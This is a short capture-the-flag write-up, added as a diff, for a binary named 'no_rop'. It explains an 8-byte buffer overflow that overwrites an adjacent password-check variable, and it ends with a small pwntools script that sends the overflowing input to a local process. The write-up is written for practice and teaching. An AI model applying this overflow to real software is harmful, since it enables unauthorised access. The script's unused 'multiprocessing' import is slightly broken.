@@ -1,0 +1,22 @@
+SOLUTION 1 (ida64):
+
+Using ida64 you can easly see the flag!
+
+SOLUTION 2 (ida64 [2]):
+
+Analizing the code with ida64 you can see that the baff of the password is 8 chars so if you insert an >8 chars password the last char will overwrite the baff of pass variable and if it is != 0 then it will get me the flag
+
+SOLUTION 3 (PWN):
+
+You can see the c code so analyzing it you can see that the buffer witch contains the user input is of 8 chars so if you insert a 9 char string the pss variable will be setted as the value of the last char of the input. You can create a python script and use pwd library to do it:
+
+from multiprocessing import process
+from pwn import *
+
+g = 'a' * 8
+msg = '1'
+msgin = g + msg
+
+p = process("./no_rop")
+p.sendline(msgin)
+print(f"\n\n {p.recvall()}")
